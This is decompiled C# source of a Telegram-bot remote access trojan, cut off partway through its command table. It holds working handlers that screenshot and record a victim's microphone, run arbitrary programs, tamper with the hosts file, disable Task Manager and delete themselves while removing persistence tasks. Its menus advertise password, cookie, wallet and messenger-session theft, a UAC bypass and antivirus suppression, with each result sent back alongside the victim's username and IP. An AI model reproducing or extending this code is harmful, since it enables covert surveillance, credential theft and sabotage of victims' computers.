using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Telegram.Bot;
using Telegram.Bot.Types;
using TelegramBot.Anti;
using TelegramBot.Main;
using TelegramBot.Session;
using TelegramBot.Shell;

namespace TelegramBot
{
	// Token: 0x02000017 RID: 23
	internal class Commands
	{
		// Token: 0x0600005F RID: 95 RVA: 0x00004F70 File Offset: 0x00003170
		public static void ListCommands()
		{
			try
			{
				List<FirstParser> list = Commands.state;
				FirstParser firstParser = new FirstParser();
				firstParser.Command = "/start";
				firstParser.CountArgs = 0;
				firstParser.Example = "/start";
				firstParser.Execute = async delegate(FirstModel model, Update update)
				{
					ReplyKeyboardMarkup replyMarkup = new ReplyKeyboardMarkup
					{
						Keyboard = new string[][]
						{
							new string[]
							{
								"/help"
							},
							new string[]
							{
								"/getscreen"
							}
						}
					};
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Привет бро, Я готов тебе служить, а также буду выполнять все твои приказы и указания \nВот список всех команд:\n" + string.Join("\n", from s in Commands.state
					select s.Example) + "\nИ клавиатура для быстрого набора команд без параметров.", true, 0, replyMarkup, false);
				};
				firstParser.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /start", false, 0, null, false);
				};
				list.Add(firstParser);
				List<FirstParser> list2 = Commands.commands;
				FirstParser firstParser2 = new FirstParser();
				firstParser2.Command = "/help";
				firstParser2.CountArgs = 0;
				firstParser2.Example = "/help";
				firstParser2.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "/help\n/getscreen\n/record\n======================\n/sysinfo\n/activewindow\n/openwindows\n/programms\n/processlist\n/killprocess [process]\n/run [path]\n/clipboard\n/location\n======================\n/blocksite [example google.com]\n/redirectprogramm [first] [second]\n/blockprogramm [name] [block|unblock]\n======================\n/CmstpBypass\n/OffCertChecking\n/OffAvNotification\n======================\n/opencd\n/closecd\n/exploreroff\n/exploreron\n/hidetaskbar\n/showtaskbar\n/wallpaper\n/collapsewindows\n======================\n/reboot\n/kill\n/suicide\n======================\n/back", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser2.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /help", false, 0, null, false);
				};
				list2.Add(firstParser2);
				List<FirstParser> list3 = Commands.state;
				FirstParser firstParser3 = new FirstParser();
				firstParser3.Command = "/help";
				firstParser3.CountArgs = 0;
				firstParser3.Example = "/help";
				firstParser3.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Join("\n", from s in Commands.state
						select s.Example), false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser3.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /help", false, 0, null, false);
				};
				list3.Add(firstParser3);
				List<SecondParser> list4 = Commands.filemanager;
				SecondParser secondParser = new SecondParser();
				secondParser.Command = "/help";
				secondParser.Example = "/help";
				secondParser.Execute = async delegate(SecondModel model, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Вот списочек моих команд в режиме файлменеджера (*^‿^*)\n\nСписок дисков:  drives\nПеремещение:  cd [Path]\nВернуться в прошлую папку:  back или cd ..\nПросмотр содержимого:  ls\nИнформация о файле или папке:  info [Path]\nЗапуск программ: run [Path]\nОтправка текста из файла: read [Path]\nОтправка файлов:  send [Path]\nПеремещение файлов и папок: remove [Path2File],[Path2Dir]\nПереименование:  rename [Path],[NewNameWithExt]\nСоздание папок: mkdir [Path]\nУдаление файлов и папок: delete [Path]\nТакже все отправленные тобой файлы будут сохранены в той папке в которой ты,Бро сейчас находишься.", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				secondParser.OnError = async delegate(SecondModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /help", false, 0, null, false);
				};
				list4.Add(secondParser);
				List<SecondParser> list5 = Commands.simplecomp;
				SecondParser secondParser2 = new SecondParser();
				secondParser2.Command = "/help";
				secondParser2.Example = "/help";
				secondParser2.Execute = async delegate(SecondModel model, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\n/help\n!run\n!show\n!del\n!clear\n/back", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				list5.Add(secondParser2);
				List<FirstParser> list6 = Commands.settings;
				FirstParser firstParser4 = new FirstParser();
				firstParser4.Command = "/help";
				firstParser4.CountArgs = 0;
				firstParser4.Example = "/help";
				firstParser4.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "/help\n/getscreen\n======================\n/wallets\n/ClipperStart\n/ClipperStop\n======================\n/StartScreenLogger\n/SendScreenshots\n/StopScreenLogger\n======================\n/ClipboardLoggerStart\n/ClipboardLoggerSend\n/ClipboardLoggerStop\n======================\n/SaveConfig\n======================\n/back", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser4.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /help", false, 0, null, false);
				};
				list6.Add(firstParser4);
				List<FirstParser> list7 = Commands.grab;
				FirstParser firstParser5 = new FirstParser();
				firstParser5.Command = "/help";
				firstParser5.CountArgs = 0;
				firstParser5.Example = "/help";
				firstParser5.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "/help\n/getscreen\n======================\n/wifilist\n/wifipass [ESSID]\n======================\n/StealPasswords\n/StealCookies\n======================\n/GetTelegramSession\n/GetSteamFiles\n/GetFileZillaConfig\n/GetDiscordSession\n/GetSkypeSession\n/GetViberSession\n======================\n/back", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser5.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /help", false, 0, null, false);
				};
				list7.Add(firstParser5);
				List<FirstParser> list8 = Commands.commands;
				FirstParser firstParser6 = new FirstParser();
				firstParser6.Command = "/sysinfo";
				firstParser6.CountArgs = 0;
				firstParser6.Example = "/sysinfo ";
				firstParser6.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\n",
							Func.Info
						}), false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser6.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /sysinfo", false, 0, null, false);
				};
				list8.Add(firstParser6);
				List<FirstParser> list9 = Commands.commands;
				FirstParser firstParser7 = new FirstParser();
				firstParser7.Command = "/suicide";
				firstParser7.CountArgs = 0;
				firstParser7.Example = "/suicide";
				firstParser7.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Process.Start(new ProcessStartInfo
						{
							Arguments = "/delete /tn UpdateWindows /f",
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true,
							FileName = "schtasks.exe",
							RedirectStandardOutput = true,
							UseShellExecute = false
						});
						Process.Start(new ProcessStartInfo
						{
							Arguments = "/delete /tn Login" + Environment.UserName + "/f",
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true,
							FileName = "schtasks.exe",
							RedirectStandardOutput = true,
							UseShellExecute = false
						});
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nПрощай Жестокий Мир!", false, 0, null, false);
						Process.Start(new ProcessStartInfo
						{
							Arguments = "/c choice /C Y /N /D Y /T 1 & Del \"" + Application.ExecutablePath + "\"",
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true,
							FileName = "cmd.exe",
							RedirectStandardOutput = true,
							UseShellExecute = false
						});
						Environment.Exit(0);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser7.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /sysinfo", false, 0, null, false);
				};
				list9.Add(firstParser7);
				List<FirstParser> list10 = Commands.commands;
				FirstParser firstParser8 = new FirstParser();
				firstParser8.Command = "/getscreen";
				firstParser8.CountArgs = 0;
				firstParser8.Example = "/getscreen";
				firstParser8.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						ScrL.ScreenShot(Commands.directory + "screen.png");
						using (FileStream stream = System.IO.File.OpenRead(Commands.directory + "screen.png"))
						{
							await Commands.Bot.SendPhoto((long)update.Message.From.Id, new FileToSend(stream.Name, stream), "", 0, null);
						}
						FileStream stream = null;
						System.IO.File.Delete(Commands.directory + "screen.png");
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser8.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /getscreen", false, 0, null, false);
				};
				list10.Add(firstParser8);
				List<FirstParser> list11 = Commands.state;
				FirstParser firstParser9 = new FirstParser();
				firstParser9.Command = "/getscreen";
				firstParser9.CountArgs = 0;
				firstParser9.Example = "/getscreen";
				firstParser9.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						ScrL.ScreenShot(Commands.directory + "screen.png");
						using (FileStream stream = System.IO.File.OpenRead(Commands.directory + "screen.png"))
						{
							await Commands.Bot.SendPhoto((long)update.Message.From.Id, new FileToSend(stream.Name, stream), "", 0, null);
						}
						FileStream stream = null;
						System.IO.File.Delete(Commands.directory + "screen.png");
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser9.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /getscreen", false, 0, null, false);
				};
				list11.Add(firstParser9);
				List<FirstParser> list12 = Commands.settings;
				FirstParser firstParser10 = new FirstParser();
				firstParser10.Command = "/getscreen";
				firstParser10.CountArgs = 0;
				firstParser10.Example = "/getscreen";
				firstParser10.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						ScrL.ScreenShot(Commands.directory + "screen.png");
						using (FileStream stream = System.IO.File.OpenRead(Commands.directory + "screen.png"))
						{
							await Commands.Bot.SendPhoto((long)update.Message.From.Id, new FileToSend(stream.Name, stream), "", 0, null);
						}
						FileStream stream = null;
						System.IO.File.Delete(Commands.directory + "screen.png");
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser10.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /getscreen", false, 0, null, false);
				};
				list12.Add(firstParser10);
				List<FirstParser> list13 = Commands.grab;
				FirstParser firstParser11 = new FirstParser();
				firstParser11.Command = "/getscreen";
				firstParser11.CountArgs = 0;
				firstParser11.Example = "/getscreen";
				firstParser11.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						ScrL.ScreenShot(Commands.directory + "screen.png");
						using (FileStream stream = System.IO.File.OpenRead(Commands.directory + "screen.png"))
						{
							await Commands.Bot.SendPhoto((long)update.Message.From.Id, new FileToSend(stream.Name, stream), "", 0, null);
						}
						FileStream stream = null;
						System.IO.File.Delete(Commands.directory + "screen.png");
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser11.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /getscreen", false, 0, null, false);
				};
				list13.Add(firstParser11);
				List<FirstParser> list14 = Commands.commands;
				FirstParser firstParser12 = new FirstParser();
				firstParser12.Command = "/record";
				firstParser12.CountArgs = 0;
				firstParser12.Example = "/record";
				firstParser12.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Sounds.Start();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nЗапись началась", false, 0, null, false);
						Thread.Sleep(20000);
						Sounds.Stop();
						using (FileStream stream = System.IO.File.OpenRead(Commands.directory + "record.wav"))
						{
							await Commands.Bot.SendVoice((long)update.Message.From.Id, new FileToSend("record.wav", stream), 0, 0, null);
						}
						FileStream stream = null;
						System.IO.File.Delete(Commands.directory + "record.wav");
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser12.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /record", false, 0, null, false);
				};
				list14.Add(firstParser12);
				List<FirstParser> list15 = Commands.commands;
				FirstParser firstParser13 = new FirstParser();
				firstParser13.Command = "/blocksite";
				firstParser13.CountArgs = 1;
				firstParser13.Example = "/blocksite [example google.com]";
				firstParser13.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						RedirectAndBlock.block(model.Args.First<string>());
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nСайт ",
							model.Args.First<string>(),
							" Заблокировал ┐(￣ヘ￣)┌ "
						}), false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser13.OnError = async delegate(FirstModel model, Update update)
				{
					new StreamWriter("C:\\Windows\\System32\\drivers\\etc\\hosts", false).Close();
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Все сайты разблокированы ┐(￣ヘ￣)┌", false, 0, null, false);
				};
				list15.Add(firstParser13);
				List<FirstParser> list16 = Commands.commands;
				FirstParser firstParser14 = new FirstParser();
				firstParser14.Command = "/redirectprogramm";
				firstParser14.CountArgs = 2;
				firstParser14.Example = "/redirectprogramm [first] [second]";
				firstParser14.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						if (Check.Acess)
						{
							RedirectAndBlock.redirectkapp(model.Args.First<string>(), model.Args.Last<string>());
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nТеперь программка будет перенаправляться (ーー;)", false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУ меня нет прав администратора (◣_◢)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser14.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /redirectprogramm [first] [second]", false, 0, null, false);
				};
				list16.Add(firstParser14);
				List<FirstParser> list17 = Commands.commands;
				FirstParser firstParser15 = new FirstParser();
				firstParser15.Command = "/blockprogramm";
				firstParser15.CountArgs = 2;
				firstParser15.Example = "/blockprogramm [name] [block|unblock]";
				firstParser15.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						if (Check.Acess)
						{
							if (model.Args.Last<string>() == "unblock")
							{
								RedirectAndBlock.unblockapp(model.Args.First<string>());
								await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nПрограмма вновь может запускаться ┐(￣ヘ￣)┌", false, 0, null, false);
							}
							if (model.Args.Last<string>() == "block")
							{
								RedirectAndBlock.blockapp(model.Args.First<string>());
								await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nПрограмма заблокированна ┐(￣ヘ￣)┌", false, 0, null, false);
							}
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУ меня нет прав администратора (◣_◢)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser15.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /blockprogramm [name] [block|unblock]", false, 0, null, false);
				};
				list17.Add(firstParser15);
				List<FirstParser> list18 = Commands.commands;
				FirstParser firstParser16 = new FirstParser();
				firstParser16.Command = "/run";
				firstParser16.CountArgs = 1;
				firstParser16.Example = "/run";
				firstParser16.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Func.Run(model.Args.First<string>());
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВыполнил (^_−)", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser16.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /run [path]", false, 0, null, false);
				};
				list18.Add(firstParser16);
				List<FirstParser> list19 = Commands.commands;
				FirstParser firstParser17 = new FirstParser();
				firstParser17.Command = "/opencd";
				firstParser17.CountArgs = 0;
				firstParser17.Example = "/opencd";
				firstParser17.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						DLLImport.mciSendString("set cdaudio door open", null, 0, IntPtr.Zero);
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВыполнил (^_−)", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser17.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /opencd", false, 0, null, false);
				};
				list19.Add(firstParser17);
				List<FirstParser> list20 = Commands.commands;
				FirstParser firstParser18 = new FirstParser();
				firstParser18.Command = "/closecd";
				firstParser18.CountArgs = 0;
				firstParser18.Example = "/closecd";
				firstParser18.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						DLLImport.mciSendString("set cdaudio door closed", null, 0, IntPtr.Zero);
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВыполнил (^_−)", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser18.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /closecd", false, 0, null, false);
				};
				list20.Add(firstParser18);
				List<FirstParser> list21 = Commands.commands;
				FirstParser firstParser19 = new FirstParser();
				firstParser19.Command = "/exploreroff";
				firstParser19.CountArgs = 0;
				firstParser19.Example = "/exploreroff";
				firstParser19.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						if (Check.Acess)
						{
							string value = "1";
							string subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
							RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
							registryKey.SetValue("DisableTaskMgr", value);
							registryKey.Close();
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВыполнил (^_−)", false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУ меня нет прав администратора (◣_◢)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser19.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /exploreroff", false, 0, null, false);
				};
				list21.Add(firstParser19);
				List<FirstParser> list22 = Commands.commands;
				FirstParser firstParser20 = new FirstParser();
				firstParser20.Command = "/exploreron";
				firstParser20.CountArgs = 0;
				firstParser20.Example = "/exploreron";
				firstParser20.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						if (Check.Acess)
						{
							RegistryKey currentUser = Registry.CurrentUser;
							currentUser.DeleteSubKeyTree("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
							currentUser.Close();
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nВыполнил (^_−)", false, 0, null, false);
						}
						else
						{
							await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nУ меня нет прав администратора (◣_◢)", false, 0, null, false);
						}
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser20.OnError = async delegate(FirstModel model, Update update)
				{
					await Commands.Bot.SendTextMessage((long)update.Message.From.Id, "Не верное кол-во агрументов (；⌣̀_⌣́)\nИспользуй команду так: /exploreron", false, 0, null, false);
				};
				list22.Add(firstParser20);
				List<FirstParser> list23 = Commands.commands;
				FirstParser firstParser21 = new FirstParser();
				firstParser21.Command = "/hidetaskbar";
				firstParser21.CountArgs = 0;
				firstParser21.Example = "/hidetaskbar";
				firstParser21.Execute = async delegate(FirstModel model, Update update)
				{
					int num = 0;
					try
					{
						Taskbar.Hide();
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, Environment.UserName + "/" + Commands.pubIp + "\nСделано (>ω^)", false, 0, null, false);
					}
					catch (Exception obj)
					{
						num = 1;
					}
					object obj;
					if (num == 1)
					{
						Exception ex2 = (Exception)obj;
						await Commands.Bot.SendTextMessage((long)update.Message.From.Id, string.Concat(new string[]
						{
							Environment.UserName,
							"/",
							Commands.pubIp,
							"\nВо мне произошла ошибка: ",
							ex2.Message
						}), false, 0, null, false);
					}
					obj = null;
				};
				firstParser21.OnError = async delegate(FirstModel model, Update update)
				{
